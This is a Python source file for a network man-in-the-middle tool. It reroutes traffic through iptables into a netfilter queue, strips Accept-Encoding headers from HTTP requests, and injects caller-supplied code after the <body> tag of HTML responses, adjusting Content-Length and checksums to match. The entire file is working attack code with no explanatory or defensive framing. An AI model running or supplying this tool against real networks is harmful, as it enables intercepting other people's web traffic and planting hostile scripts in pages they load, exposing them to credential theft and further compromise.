#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re
import subprocess

class Code_Injector:

    def __init__(self, c):
        self.injection_code = c

    def set_load(self,packet,load):
        packet[scapy.Raw].load = load

        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum

        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            try:
                load = scapy_packet[scapy.Raw].load.decode()
                if scapy_packet[scapy.TCP].dport == 80:
                    print("[+] Request")
                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

                elif scapy_packet[scapy.TCP].sport == 80:
                    print("[+] Response")
                    load = load.replace("<body>", "<body>" + self.injection_code)
                    content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                    if content_length_search and "text/html" in load:
                        content_length = content_length_search.group(1)
                        new_content_length = int(content_length) + len(self.injection_code)
                        load = load.replace(content_length, str(new_content_length))

                if load!= scapy_packet[scapy.Raw].load :
                    new_packet = self.set_load(scapy_packet, load)
                    packet.set_payload(bytes(new_packet))
            except UnicodeDecodeError:
                pass

        packet.accept()


    def start(self):
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.process_packet)
        queue.run()